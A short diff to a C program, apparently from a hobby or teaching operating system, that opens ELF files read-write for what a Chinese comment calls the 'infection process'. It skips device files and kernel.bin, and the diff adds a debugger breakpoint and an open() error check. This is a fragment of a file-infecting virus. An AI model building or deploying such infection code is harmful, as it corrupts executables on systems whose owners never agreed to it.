@@ -1,6 +1,7 @@
 #include "myelf.h"
 #include "stdio.h"
 #include "string.h"
+extern int is_inited;
 
 int strncmp(char* a, char* b, int n) {
     int i = 0;
@@ -39,7 +40,13 @@ int main(int argc,char * argv[] )
      
      if (strncmp(temp, "dev", 3) != 0 && strncmp(temp, "kernel.bin", 10) != 0) {  // 下面是感染过程
                 // 不读驱动 不读kernel.bin
+                __asm__ __volatile__("xchg %bx, %bx");
                 int old_file = open(temp, O_RDWR);
+                if(old_file == -1)
+                {
+                    printf("access denied!\n");
+                    return 0;
+                }
                 read(old_file, &elf_ehdr, sizeof(elf_ehdr));
                 // 判断是否是一个 ELF 文件
                 printf("%s,", temp);
